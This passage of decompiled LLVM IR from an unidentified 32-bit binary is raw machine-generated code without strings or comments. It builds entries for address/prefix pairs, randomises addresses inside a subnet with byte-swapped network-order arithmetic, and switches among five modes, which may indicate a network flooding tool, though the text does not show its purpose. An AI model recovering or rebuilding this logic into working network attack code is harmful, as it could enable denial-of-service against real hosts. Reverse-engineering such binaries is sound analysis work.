  br i1 %v7_80482b6215, label %dec_label_pc_80482b8, label %dec_label_pc_80482dd

dec_label_pc_80482b8:                             ; preds = %dec_label_pc_804829d.preheader, %dec_label_pc_80482cc
  %v4_80482a0218 = phi i32 [ %v4_80482a0, %dec_label_pc_80482cc ], [ %v6_80481cf, %dec_label_pc_804829d.preheader ]
  %v4_80482be217 = phi i32 [ %v1_80482d3, %dec_label_pc_80482cc ], [ 0, %dec_label_pc_804829d.preheader ]
  %v3_80482b8216 = phi i8* [ %v3_80482a0.pre, %dec_label_pc_80482cc ], [ %tmp239, %dec_label_pc_804829d.preheader ]
  %v2_80482bc = add i32 %v4_80482be217, %v4_80482a0218
  %v12_80482bc = icmp eq i32 %v2_80482bc, 0
  store i1 %v12_80482bc, i1* %zf.global-to-local, align 1
  store i32 %v2_80482bc, i32* %ecx.global-to-local, align 4
  %v1_80482be = inttoptr i32 %v2_80482bc to i8*
  %v2_80482be = load i8, i8* %v1_80482be, align 1
  %v3_80482be = zext i8 %v2_80482be to i32
  %v5_80482be = and i32 %v4_80482be217, -256
  %v6_80482be = or i32 %v3_80482be, %v5_80482be
  store i32 %v6_80482be, i32* %edx.global-to-local, align 4
  %v1_80482c0 = add i32 %v6_80482be, -97
  store i32 %v1_80482c0, i32* %eax.global-to-local, align 4
  %v1_80482c3 = trunc i32 %v1_80482c0 to i8
  %v11_80482c3 = icmp eq i8 %v1_80482c3, 25
  store i1 %v11_80482c3, i1* %zf.global-to-local, align 1
  %v8_80482c5 = icmp ugt i8 %v1_80482c3, 25
  br i1 %v8_80482c5, label %dec_label_pc_80482cc, label %dec_label_pc_80482c7

dec_label_pc_80482c7:                             ; preds = %dec_label_pc_80482b8
  %v1_80482c7 = add i32 %v6_80482be, -32
  store i32 %v1_80482c7, i32* %eax.global-to-local, align 4
  %v1_80482ca = trunc i32 %v1_80482c7 to i8
  store i8 %v1_80482ca, i8* %v1_80482be, align 1
  %v0_804829d.pre.pre = load i32, i32* @esp, align 4
  %v3_80482a0.pre.pre = load i8*, i8** %stack_var_-20900, align 4
  br label %dec_label_pc_80482cc

dec_label_pc_80482cc:                             ; preds = %dec_label_pc_80482b8, %dec_label_pc_80482c7
  %v3_80482a0.pre = phi i8* [ %v3_80482b8216, %dec_label_pc_80482b8 ], [ %v3_80482a0.pre.pre, %dec_label_pc_80482c7 ]
  %v0_804829d.pre = phi i32 [ %v15_8048194, %dec_label_pc_80482b8 ], [ %v0_804829d.pre.pre, %dec_label_pc_80482c7 ]
  %v1_80482d3 = add i32 %v4_80482be217, 1
  %v9_804829d = icmp eq i32 %v0_804829d.pre, 12
  store i1 %v9_804829d, i1* %zf.global-to-local, align 1
  %v4_80482a0 = ptrtoint i8* %v3_80482a0.pre to i32
  store i32 %v4_80482a0, i32* %eax.global-to-local, align 4
  store i32 %v4_80482a0, i32* %stack_var_-20972, align 4
  %v2_80482a5 = call i32 @function_8051c50(i8* %v3_80482a0.pre)
  store i32 %v2_80482a5, i32* %eax.global-to-local, align 4
  store i32 %v1_80482d3, i32* %edx.global-to-local, align 4
  %v12_80482b4 = icmp eq i32 %v2_80482a5, %v1_80482d3
  store i1 %v12_80482b4, i1* %zf.global-to-local, align 1
  %v7_80482b6 = icmp sgt i32 %v2_80482a5, %v1_80482d3
  br i1 %v7_80482b6, label %dec_label_pc_80482b8, label %dec_label_pc_80482dd

dec_label_pc_80482dd:                             ; preds = %dec_label_pc_80482cc, %dec_label_pc_804829d.preheader
  %v0_80482dd = load i32, i32* @edi, align 4
  %v7_80482e7 = icmp sgt i32 %v0_80482dd, 256
  %.v0_80482dd = select i1 %v7_80482e7, i32 256, i32 %v0_80482dd
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 36, i32* %stack_var_-20972, align 4
  %v2_80482f6 = call i32 @function_8051300(i8 36)
  store i32 %v2_80482f6, i32* %eax.global-to-local, align 4
  store i32 37, i32* %stack_var_-20972, align 4
  %v2_8048302 = call i32 @function_8051300(i8 37)
  store i32 %v2_8048302, i32* %eax.global-to-local, align 4
  store i32 38, i32* %stack_var_-20972, align 4
  %v2_804830e = call i32 @function_8051300(i8 38)
  store i32 %v2_804830e, i32* %eax.global-to-local, align 4
  store i32 39, i32* %stack_var_-20972, align 4
  %v2_804831a = call i32 @function_8051300(i8 39)
  store i32 %v2_804831a, i32* %eax.global-to-local, align 4
  store i32 40, i32* %stack_var_-20972, align 4
  %v2_8048326 = call i32 @function_8051300(i8 40)
  store i32 %v2_8048326, i32* %eax.global-to-local, align 4
  store i32 41, i32* %stack_var_-20972, align 4
  %v2_8048332 = call i32 @function_8051300(i8 41)
  store i32 %v2_8048332, i32* %eax.global-to-local, align 4
  store i32 42, i32* %stack_var_-20972, align 4
  %v2_804833e = call i32 @function_8051300(i8 42)
  store i32 %v2_804833e, i32* %eax.global-to-local, align 4
  store i32 43, i32* %stack_var_-20972, align 4
  %v2_804834a = call i32 @function_8051300(i8 43)
  store i32 %v2_804834a, i32* %eax.global-to-local, align 4
  store i32 44, i32* %stack_var_-20972, align 4
  %v2_8048356 = call i32 @function_8051300(i8 44)
  store i32 %v2_8048356, i32* %eax.global-to-local, align 4
  store i32 45, i32* %stack_var_-20972, align 4
  %v2_8048362 = call i32 @function_8051300(i8 45)
  store i32 %v2_8048362, i32* %eax.global-to-local, align 4
  store i32 46, i32* %stack_var_-20972, align 4
  %v2_804836e = call i32 @function_8051300(i8 46)
  %v2_8048373 = load i32, i32* %stack_var_-20972, align 4
  store i32 %v2_8048373, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %.v0_80482dd, i32* @esi, align 4
  store i32 %.v0_80482dd, i32* %stack_var_-20972, align 4
  %v2_804837f = sext i32 %.v0_80482dd to i64
  %v3_804837f = call i32 @function_80532f8(i64 %v2_804837f, i32 3140)
  store i32 %v3_804837f, i32* %eax.global-to-local, align 4
  store i32 %v3_804837f, i32* @esi, align 4
  store i32 %.v0_80482dd, i32* @ebx, align 4
  %v1_8048391 = icmp eq i32 %.v0_80482dd, 0
  store i1 %v1_8048391, i1* %zf.global-to-local, align 1
  %tmp138 = icmp slt i32 %.v0_80482dd, 1
  br i1 %tmp138, label %dec_label_pc_80484be, label %dec_label_pc_8048399

dec_label_pc_8048399:                             ; preds = %dec_label_pc_80482dd
  %v0_8048399 = load i32, i32* @ebp, align 4
  %v1_8048399 = trunc i32 %v0_8048399 to i8
  store i32 0, i32* @ebp, align 4
  %v1_804839d7 = urem i32 %v0_8048399, 256
  %v3_804839d = icmp eq i8 %v1_8048399, 0
  store i1 %v3_804839d, i1* %zf.global-to-local, align 1
  store i32 %v1_804839d7, i32* @ecx, align 4
  %v2_80483e1 = inttoptr i32 %v1_804839d7 to i8*
  %v2_8049f7d = inttoptr i32 %tmp to i8*
  %v1_8049f3f = trunc i32 %tmp to i8
  %v2_804a072 = inttoptr i32 %v0_804816e to i32*
  br label %dec_label_pc_80483a7

dec_label_pc_80483a7:                             ; preds = %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge, %dec_label_pc_8048399
  %v0_80483a9 = phi i32 [ %v0_80483a9.pre, %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge ], [ %v3_804837f, %dec_label_pc_8048399 ]
  %v0_80483a7 = phi i32 [ %v4_8049f85, %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge ], [ 0, %dec_label_pc_8048399 ]
  store i32 %v0_80483a7, i32* %edx.global-to-local, align 4
  %v1_80483a9 = add i32 %v0_80483a9, 4
  %v2_80483a9 = inttoptr i32 %v1_80483a9 to i8*
  store i8 0, i8* %v2_80483a9, align 1
  %v0_80483ad = load i32, i32* %edx.global-to-local, align 4
  %v2_80483ad = ashr i32 %v0_80483ad, 31
  %v3_80483ad = icmp eq i32 %v2_80483ad, 0
  store i1 %v3_80483ad, i1* %zf.global-to-local, align 1
  store i32 %v2_80483ad, i32* %edx.global-to-local, align 4
  %v0_80483b0 = load i32, i32* @ebp, align 4
  store i32 %v0_80483b0, i32* %eax.global-to-local, align 4
  %v0_80483b2 = load i32, i32* @esp, align 4
  %v1_80483b2 = add i32 %v0_80483b2, 88
  %v2_80483b2 = inttoptr i32 %v1_80483b2 to i32*
  %v3_80483b2 = load i32, i32* %v2_80483b2, align 4
  %v5_80483b2 = zext i32 %v0_80483b0 to i64
  %v7_80483b2 = zext i32 %v2_80483ad to i64
  %v8_80483b2 = mul nuw i64 %v7_80483b2, 4294967296
  %v9_80483b2 = or i64 %v5_80483b2, %v8_80483b2
  %v10_80483b2 = zext i32 %v3_80483b2 to i64
  %v11_80483b2 = sdiv i64 %v9_80483b2, %v10_80483b2
  %v12_80483b2 = trunc i64 %v11_80483b2 to i32
  store i32 %v12_80483b2, i32* %eax.global-to-local, align 4
  %v13_80483b2 = srem i64 %v9_80483b2, %v10_80483b2
  %v14_80483b2 = trunc i64 %v13_80483b2 to i32
  store i32 %v14_80483b2, i32* %edx.global-to-local, align 4
  %v1_80483b6 = add i32 %v0_80483b2, 20932
  %v2_80483b6 = inttoptr i32 %v1_80483b6 to i32*
  %v3_80483b6 = load i32, i32* %v2_80483b6, align 4
  store i32 %v3_80483b6, i32* %eax.global-to-local, align 4
  %v0_80483bd = load i32, i32* @esi, align 4
  %v1_80483bd = inttoptr i32 %v0_80483bd to i32*
  store i32 -1, i32* %v1_80483bd, align 4
  %v0_80483c3 = load i32, i32* %edx.global-to-local, align 4
  %v0_80483c6 = load i32, i32* %eax.global-to-local, align 4
  %v2_80483c6 = mul i32 %v0_80483c3, 24
  %v3_80483c6 = add i32 %v0_80483c6, %v2_80483c6
  store i32 %v3_80483c6, i32* @edi, align 4
  %v0_80483c9 = load i32, i32* @esi, align 4
  %v1_80483c9 = add i32 %v0_80483c9, 532
  store i32 %v1_80483c9, i32* %edx.global-to-local, align 4
  %v1_80483cf = load i32, i32* @esp, align 4
  %v2_80483cf = add i32 %v1_80483cf, 36
  %v3_80483cf = inttoptr i32 %v2_80483cf to i32*
  store i32 %v1_80483c9, i32* %v3_80483cf, align 4
  %v0_80483d3 = load i32, i32* @edi, align 4
  %v1_80483d3 = add i32 %v0_80483d3, 16
  %v2_80483d3 = inttoptr i32 %v1_80483d3 to i32*
  %v3_80483d3 = load i32, i32* %v2_80483d3, align 4
  store i32 %v3_80483d3, i32* %eax.global-to-local, align 4
  %v1_80483d6 = load i32, i32* @esi, align 4
  %v2_80483d6 = add i32 %v1_80483d6, 16
  %v3_80483d6 = inttoptr i32 %v2_80483d6 to i32*
  store i32 %v3_80483d3, i32* %v3_80483d6, align 4
  %v0_80483d9 = load i32, i32* @ecx, align 4
  %v1_80483d9 = load i32, i32* @esp, align 4
  %v2_80483d9 = add i32 %v1_80483d9, -4
  %v3_80483d9 = inttoptr i32 %v2_80483d9 to i32*
  store i32 %v0_80483d9, i32* %v3_80483d9, align 4
  %v0_80483da = load i32, i32* @ecx, align 4
  %v2_80483da = add i32 %v1_80483d9, -8
  %v3_80483da = inttoptr i32 %v2_80483da to i32*
  store i32 %v0_80483da, i32* %v3_80483da, align 4
  %v1_80483db = add i32 %v1_80483d9, 64
  %v2_80483db = inttoptr i32 %v1_80483db to i32*
  %v3_80483db = load i32, i32* %v2_80483db, align 4
  store i32 %v3_80483db, i32* %eax.global-to-local, align 4
  %v2_80483df = add i32 %v1_80483d9, -12
  %v3_80483df = inttoptr i32 %v2_80483df to i32*
  store i32 %v3_80483db, i32* %v3_80483df, align 4
  %v0_80483e0 = load i32, i32* %edx.global-to-local, align 4
  %v2_80483e0 = add i32 %v1_80483d9, -16
  %v3_80483e0 = inttoptr i32 %v2_80483e0 to i32*
  store i32 %v0_80483e0, i32* %v3_80483e0, align 4
  %v3_80483e1 = call i32 @function_8051c70(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80483e1, i32* %eax.global-to-local, align 4
  %v0_80483e6 = load i32, i32* @esp, align 4
  %v1_80483e6 = add i32 %v0_80483e6, 16
  %v6_80483e6 = icmp eq i32 %v1_80483e6, 0
  store i1 %v6_80483e6, i1* %zf.global-to-local, align 1
  %v0_80483e9 = load i32, i32* @esi, align 4
  %v1_80483e9 = add i32 %v0_80483e9, 532
  %v2_80483e9 = inttoptr i32 %v1_80483e9 to i8*
  %v3_80483e9 = load i8, i8* %v2_80483e9, align 1
  %v12_80483e9 = icmp eq i8 %v3_80483e9, 47
  store i1 %v12_80483e9, i1* %zf.global-to-local, align 1
  br i1 %v12_80483e9, label %dec_label_pc_804841e, label %dec_label_pc_80483f2

dec_label_pc_80483f2:                             ; preds = %dec_label_pc_80483a7
  %v9_80483f2 = icmp eq i32 %v0_80483e6, -4
  store i1 %v9_80483f2, i1* %zf.global-to-local, align 1
  %v1_80483f5 = add i32 %v0_80483e6, 52
  %v2_80483f5 = inttoptr i32 %v1_80483f5 to i32*
  %v3_80483f5 = load i32, i32* %v2_80483f5, align 4
  store i32 %v3_80483f5, i32* %eax.global-to-local, align 4
  %v3_80483f9 = inttoptr i32 %v0_80483e6 to i32*
  store i32 %v3_80483f5, i32* %v3_80483f9, align 4
  %v2_80483fa = call i32 @function_8051c50(i8* %v2_80483e1)
  store i32 %v2_80483fa, i32* %eax.global-to-local, align 4
  %v0_80483ff = load i32, i32* @esp, align 4
  %v9_80483ff = icmp eq i32 %v0_80483ff, -12
  store i1 %v9_80483ff, i1* %zf.global-to-local, align 1
  %v2_8048402 = add i32 %v0_80483ff, 8
  %v3_8048402 = inttoptr i32 %v2_8048402 to i32*
  store i32 %v2_80483fa, i32* %v3_8048402, align 4
  %v1_8048403 = add i32 %v0_80483ff, 52
  %v2_8048403 = inttoptr i32 %v1_8048403 to i32*
  %v3_8048403 = load i32, i32* %v2_8048403, align 4
  %v2_8048407 = add i32 %v0_80483ff, 4
  %v3_8048407 = inttoptr i32 %v2_8048407 to i32*
  store i32 %v3_8048403, i32* %v3_8048407, align 4
  %v0_8048408 = load i32, i32* @esi, align 4
  %v1_8048408 = add i32 %v0_8048408, 533
  store i32 %v1_8048408, i32* %eax.global-to-local, align 4
  %v3_804840e = inttoptr i32 %v0_80483ff to i32*
  store i32 %v1_8048408, i32* %v3_804840e, align 4
  %v4_804840f = call i32 @function_8052753(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804840f, i32* %eax.global-to-local, align 4
  %v0_8048414 = load i32, i32* @esi, align 4
  %v1_8048414 = add i32 %v0_8048414, 532
  %v2_8048414 = inttoptr i32 %v1_8048414 to i8*
  store i8 47, i8* %v2_8048414, align 1
  %v0_804841b = load i32, i32* @esp, align 4
  %v1_804841b = add i32 %v0_804841b, 16
  %v6_804841b = icmp eq i32 %v1_804841b, 0
  store i1 %v6_804841b, i1* %zf.global-to-local, align 1
  %v0_804841e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804841e

dec_label_pc_804841e:                             ; preds = %dec_label_pc_80483a7, %dec_label_pc_80483f2
  %v1_804841e = phi i32 [ %v1_80483e6, %dec_label_pc_80483a7 ], [ %v1_804841b, %dec_label_pc_80483f2 ]
  %v0_804841e = phi i32 [ %v3_80483e1, %dec_label_pc_80483a7 ], [ %v0_804841e.pre, %dec_label_pc_80483f2 ]
  %v2_804841e = add i32 %v1_804841e, -4
  %v3_804841e = inttoptr i32 %v2_804841e to i32*
  store i32 %v0_804841e, i32* %v3_804841e, align 4
  %v0_804841f = load i32, i32* %eax.global-to-local, align 4
  %v2_804841f = add i32 %v1_804841e, -8
  %v3_804841f = inttoptr i32 %v2_804841f to i32*
  store i32 %v0_804841f, i32* %v3_804841f, align 4
  %v1_8048420 = add i32 %v1_804841e, 56
  %v2_8048420 = inttoptr i32 %v1_8048420 to i32*
  %v3_8048420 = load i32, i32* %v2_8048420, align 4
  %v2_8048424 = add i32 %v1_804841e, -12
  %v3_8048424 = inttoptr i32 %v2_8048424 to i32*
  store i32 %v3_8048420, i32* %v3_8048424, align 4
  %v0_8048425 = load i32, i32* @esi, align 4
  %v1_8048425 = add i32 %v0_8048425, 1440
  store i32 %v1_8048425, i32* %eax.global-to-local, align 4
  %v2_804842b = add i32 %v1_804841e, -16
  %v3_804842b = inttoptr i32 %v2_804842b to i32*
  store i32 %v1_8048425, i32* %v3_804842b, align 4
  %v3_804842c = call i32 @function_8051c70(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804842c, i32* %eax.global-to-local, align 4
  %v0_8048431 = load i32, i32* @esp, align 4
  %v1_8048431 = inttoptr i32 %v0_8048431 to i32*
  %v2_8048431 = load i32, i32* %v1_8048431, align 4
  store i32 %v2_8048431, i32* @ebx, align 4
  %v0_8048433 = load i32, i32* @esi, align 4
  %v1_8048433 = add i32 %v0_8048433, 1431
  store i32 %v1_8048433, i32* %eax.global-to-local, align 4
  %v1_8048439 = add i32 %v0_8048431, 72
  %v2_8048439 = inttoptr i32 %v1_8048439 to i32*
  %v3_8048439 = load i32, i32* %v2_8048439, align 4
  store i32 %v3_8048439, i32* %ecx.global-to-local, align 4
  %v2_804843d = add i32 %v0_8048431, 4
  %v3_804843d = inttoptr i32 %v2_804843d to i32*
  store i32 %v3_8048439, i32* %v3_804843d, align 4
  %v0_804843e = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804843e, i32* %v1_8048431, align 4
  %v3_804843f = call i32 @function_8051c70(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804843f, i32* %eax.global-to-local, align 4
  %v0_8048444 = load i32, i32* @esp, align 4
  %v1_8048444 = inttoptr i32 %v0_8048444 to i32*
  %v2_8048444 = load i32, i32* %v1_8048444, align 4
  store i32 %v2_8048444, i32* %eax.global-to-local, align 4
  %v3_8048444 = add i32 %v0_8048444, 4
  %v1_8048445 = inttoptr i32 %v3_8048444 to i32*
  %v2_8048445 = load i32, i32* %v1_8048445, align 4
  store i32 %v2_8048445, i32* %edx.global-to-local, align 4
  %v1_8048446 = add i32 %v0_8048444, 76
  %v2_8048446 = inttoptr i32 %v1_8048446 to i32*
  %v3_8048446 = load i32, i32* %v2_8048446, align 4
  store i32 %v3_8048446, i32* %v1_8048445, align 4
  %v0_804844b = load i32, i32* @esi, align 4
  %v1_804844b = add i32 %v0_804844b, 789
  store i32 %v1_804844b, i32* %eax.global-to-local, align 4
  store i32 %v1_804844b, i32* %v1_8048444, align 4
  %v3_8048452 = call i32 @function_8051c70(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048452, i32* %eax.global-to-local, align 4
  %v0_8048457 = load i32, i32* @esp, align 4
  %v6_8048457 = icmp eq i32 %v0_8048457, -16
  store i1 %v6_8048457, i1* %zf.global-to-local, align 1
  %v0_804845a = load i32, i32* @edi, align 4
  %v1_804845a = add i32 %v0_804845a, 20
  %v2_804845a = inttoptr i32 %v1_804845a to i8*
  %v3_804845a = load i8, i8* %v2_804845a, align 1
  %v12_804845a = icmp eq i8 %v3_804845a, 31
  store i1 %v12_804845a, i1* %zf.global-to-local, align 1
  %tmp240 = icmp ult i8 %v3_804845a, 32
  br i1 %tmp240, label %dec_label_pc_8048460, label %dec_label_pc_804848a

dec_label_pc_8048460:                             ; preds = %dec_label_pc_804841e
  %v1_8048460 = add i32 %v0_804845a, 16
  %v2_8048460 = inttoptr i32 %v1_8048460 to i32*
  %v3_8048460 = load i32, i32* %v2_8048460, align 4
  store i32 %v3_8048460, i32* %ebx.global-to-local, align 4
  %v1_8048463 = call i32 @function_804f070(i32 %v1_804839d7)
  store i32 %v1_8048463, i32* %eax.global-to-local, align 4
  %v1_8048468 = trunc i32 %v3_8048460 to i16
  %v2_8048468 = call i16 @llvm.bswap.i16(i16 %v1_8048468)
  %v3_8048468 = zext i16 %v2_8048468 to i32
  %v1_804846c = udiv i32 %v3_8048460, 65536
  %v2_804846c = mul nuw i32 %v3_8048468, 65536
  %v1_804846f = trunc i32 %v1_804846c to i16
  %v2_804846f = call i16 @llvm.bswap.i16(i16 %v1_804846f)
  %v3_804846f = zext i16 %v2_804846f to i32
  %v6_804846f = or i32 %v3_804846f, %v2_804846c
  store i32 %v6_804846f, i32* %ebx.global-to-local, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ecx.global-to-local, align 4
  %v0_8048475 = load i32, i32* @edi, align 4
  %v1_8048475 = add i32 %v0_8048475, 20
  %v2_8048475 = inttoptr i32 %v1_8048475 to i8*
  %v3_8048475 = load i8, i8* %v2_8048475, align 1
  %v4_8048475 = zext i8 %v3_8048475 to i32
  store i32 %v4_8048475, i32* %ecx.global-to-local, align 4
  %tmp244 = urem i8 %v3_8048475, 32
  %v4_8048478 = icmp eq i8 %tmp244, 0
  br i1 %v4_8048478, label %bb139, label %bb

bb:                                               ; preds = %dec_label_pc_8048460
  %v2_8048478 = zext i8 %tmp244 to i32
  %v5_8048478 = lshr i32 %v1_8048463, %v2_8048478
  %v6_8048478 = icmp eq i32 %v5_8048478, 0
  store i1 %v6_8048478, i1* %zf.global-to-local, align 1
  store i32 %v5_8048478, i32* %eax.global-to-local, align 4
  br label %bb139

bb139:                                            ; preds = %dec_label_pc_8048460, %bb
  %v0_804847a = phi i32 [ %v1_8048463, %dec_label_pc_8048460 ], [ %v5_8048478, %bb ]
  %v2_804847a = add i32 %v0_804847a, %v6_804846f
  %v12_804847a = icmp eq i32 %v2_804847a, 0
  store i1 %v12_804847a, i1* %zf.global-to-local, align 1
  %v1_804847c = trunc i32 %v2_804847a to i16
  %v2_804847c = call i16 @llvm.bswap.i16(i16 %v1_804847c)
  %v3_804847c = zext i16 %v2_804847c to i32
  %v1_8048480 = udiv i32 %v2_804847a, 65536
  %v2_8048480 = mul nuw i32 %v3_804847c, 65536
  %v1_8048483 = trunc i32 %v1_8048480 to i16
  %v2_8048483 = call i16 @llvm.bswap.i16(i16 %v1_8048483)
  %v3_8048483 = zext i16 %v2_8048483 to i32
  %v6_8048483 = or i32 %v3_8048483, %v2_8048480
  store i32 %v6_8048483, i32* %eax.global-to-local, align 4
  %v1_8048487 = load i32, i32* @esi, align 4
  %v2_8048487 = add i32 %v1_8048487, 16
  %v3_8048487 = inttoptr i32 %v2_8048487 to i32*
  store i32 %v6_8048483, i32* %v3_8048487, align 4
  br label %dec_label_pc_804848a

dec_label_pc_804848a:                             ; preds = %dec_label_pc_804841e, %bb139
  %v1_804848a = call i32 @function_804f070(i32 %v1_804839d7)
  %v2_804848a = sext i32 %v1_804848a to i64
  store i32 -858993459, i32* @ecx, align 4
  store i32 %v1_804848a, i32* @ebx, align 4
  %v5_8048496 = mul nuw nsw i64 %v2_804848a, 3435973837
  %v6_8048496 = trunc i64 %v5_8048496 to i32
  %v7_8048496 = udiv i64 %v5_8048496, 4294967296
  %v8_8048496 = trunc i64 %v7_8048496 to i32
  store i32 %v6_8048496, i32* %eax.global-to-local, align 4
  store i32 %v8_8048496, i32* %edx.global-to-local, align 4
  %v1_8048498 = load i32, i32* @esp, align 4
  %v2_8048498 = add i32 %v1_8048498, 12
  %v3_8048498 = inttoptr i32 %v2_8048498 to i32*
  store i32 %v8_8048496, i32* %v3_8048498, align 4
  %v0_804849c = load i32, i32* %eax.global-to-local, align 4
  %v1_804849c = load i32, i32* @esp, align 4
  %v2_804849c = add i32 %v1_804849c, 8
  %v3_804849c = inttoptr i32 %v2_804849c to i32*
  store i32 %v0_804849c, i32* %v3_804849c, align 4
  %v0_80484a0 = load i32, i32* @esp, align 4
  %v1_80484a0 = add i32 %v0_80484a0, 12
  %v2_80484a0 = inttoptr i32 %v1_80484a0 to i32*
  %v3_80484a0 = load i32, i32* %v2_80484a0, align 4
  %v0_80484a4 = load i32, i32* @ebx, align 4
  %v2_80484a6 = udiv i32 %v3_80484a0, 4
  %v3_80484a9 = mul i32 %v2_80484a6, 5
  store i32 %v3_80484a9, i32* %edx.global-to-local, align 4
  %v2_80484ac = sub i32 %v0_80484a4, %v3_80484a9
  store i32 %v2_80484ac, i32* %eax.global-to-local, align 4
  %v9_80484ae = icmp eq i32 %v2_80484ac, 4
  store i1 %v9_80484ae, i1* %zf.global-to-local, align 1
  switch i32 %v2_80484ac, label %dec_label_pc_8049f6a [
    i32 0, label %dec_label_pc_8049f3a
    i32 1, label %dec_label_pc_8049fc3
    i32 2, label %dec_label_pc_8049ff8
    i32 3, label %dec_label_pc_804a062
  ]

dec_label_pc_80484be:                             ; preds = %dec_label_pc_80482dd
  %v1_80484be = add i32 %v3_804837f, 16
  store i32 %v1_80484be, i32* %edx.global-to-local, align 4
  %v2_80484c1 = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_80484c1, i32* %ecx.global-to-local, align 4
  %v2_80484c8 = ptrtoint i32* %stack_var_-344 to i32
  store i32 %v2_80484c8, i32* %eax.global-to-local, align 4
  %v1_80484cf = add i32 %v3_804837f, 1452
  %v9_80484cf = icmp eq i32 %v1_80484cf, 0
  store i1 %v9_80484cf, i1* %zf.global-to-local, align 1
  store i32 %v1_80484cf, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80484e5.preheader

dec_label_pc_80484e5.preheader:                   ; preds = %dec_label_pc_80484be, %dec_label_pc_8049f8f
  %v0_80484e5.pre = phi i32 [ %v0_80484e5.pre.pre, %dec_label_pc_8049f8f ], [ %v15_8048194, %dec_label_pc_80484be ]
  %stack_var_-20924.0.ph = phi i32 [ %tmp, %dec_label_pc_8049f8f ], [ %v1_80484cf, %dec_label_pc_80484be ]
  %v1_80484ea = inttoptr i32 %stack_var_-20924.0.ph to i32*
  %v1_8048752 = inttoptr i32 %stack_var_-20924.0.ph to i8*
  %v1_804887b = trunc i32 %stack_var_-20924.0.ph to i8
  %v3_8048aab = sext i32 %stack_var_-20924.0.ph to i64
  br label %dec_label_pc_80484e5

dec_label_pc_80484e5:                             ; preds = %dec_label_pc_8048ce9, %dec_label_pc_8048cdd, %dec_label_pc_80484e5, %dec_label_pc_8048d91, %dec_label_pc_80484e5.preheader
  %v0_80484e5 = phi i32 [ %v0_80484e5.pre, %dec_label_pc_80484e5.preheader ], [ %v1_804850c, %dec_label_pc_80484e5 ], [ %v0_8048597, %dec_label_pc_8048cdd ], [ %v1_8048d39, %dec_label_pc_8048ce9 ], [ %v0_8048da7, %dec_label_pc_8048d91 ]
  %v9_80484e5 = icmp eq i32 %v0_80484e5, 12
  store i1 %v9_80484e5, i1* %zf.global-to-local, align 1
  %v1_80484e8 = add i32 %v0_80484e5, -16
  %v2_80484e8 = inttoptr i32 %v1_80484e8 to i32*
  store i32 0, i32* %v2_80484e8, align 4
  %v2_80484ea = call i32 @function_80524b2(i32* %v1_80484ea)
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_80484f4 = load i32, i32* @esp, align 4
  %v2_80484f4 = add i32 %v1_80484f4, 96
  %v3_80484f4 = inttoptr i32 %v2_80484f4 to i32*
  store i32 %v2_80484ea, i32* %v3_80484f4, align 4
  %v0_80484f8 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80484f8, i32* %ecx.global-to-local, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80484fc = load i32, i32* @esp, align 4
  %v1_80484fc = add i32 %v0_80484fc, 40
  %v2_80484fc = inttoptr i32 %v1_80484fc to i32*
  %v3_80484fc = load i32, i32* %v2_80484fc, align 4
  %v4_80484fc = inttoptr i32 %v3_80484fc to i8*
  store i32 %v3_80484fc, i32* %edi.global-to-local, align 4
  %v5_8048501 = call i8* @_memset(i8* %v4_80484fc, i32 0, i32 %v0_80484f8)
  %v0_8048503 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8048503, i32* %ecx.global-to-local, align 4
  %v0_8048505 = load i32, i32* @esp, align 4
  %v1_8048505 = add i32 %v0_8048505, 36
  %v2_8048505 = inttoptr i32 %v1_8048505 to i32*
  %v3_8048505 = load i32, i32* %v2_8048505, align 4
  %v4_8048505 = inttoptr i32 %v3_8048505 to i8*
  store i32 %v3_8048505, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v2_804850a = load i32, i32* %eax.global-to-local, align 4
  %v5_804850a = call i8* @_memset(i8* %v4_8048505, i32 %v2_804850a, i32 %v0_8048503)
  %v6_804850a = ptrtoint i8* %v5_804850a to i32
  store i32 %v6_804850a, i32* @ecx, align 4
  %v0_804850c = load i32, i32* @esp, align 4
  %v1_804850c = add i32 %v0_804850c, 16
  %v1_804850f = add i32 %v0_804850c, 128
  %v2_804850f = inttoptr i32 %v1_804850f to i32*
  %v3_804850f = load i32, i32* %v2_804850f, align 4
  store i32 %v3_804850f, i32* %esi.global-to-local, align 4
  %v1_8048513 = icmp eq i32 %v3_804850f, 0
  store i1 %v1_8048513, i1* %zf.global-to-local, align 1
  %tmp140 = icmp slt i32 %v3_804850f, 1
  br i1 %tmp140, label %dec_label_pc_80484e5, label %dec_label_pc_8048517

dec_label_pc_8048517:                             ; preds = %dec_label_pc_80484e5
  %v1_8048517 = add i32 %v0_804850c, 64
  %v2_8048517 = inttoptr i32 %v1_8048517 to i32*
  %v3_8048517 = load i32, i32* %v2_8048517, align 4
  store i32 %v3_8048517, i32* %esi.global-to-local, align 4
  %v1_804851b = add i32 %v0_804850c, 44
  %v2_804851b = inttoptr i32 %v1_804851b to i32*
  %v3_804851b = load i32, i32* %v2_804851b, align 4
  store i32 %v3_804851b, i32* @ebp, align 4
  %v1_804851f = add i32 %v3_8048517, 1440
  %v6_804851f = icmp eq i32 %v1_804851f, 0
  store i1 %v6_804851f, i1* %zf.global-to-local, align 1
  store i32 %v1_804851f, i32* @esi, align 4
  %v1_8048525 = add i32 %v0_804850c, 116
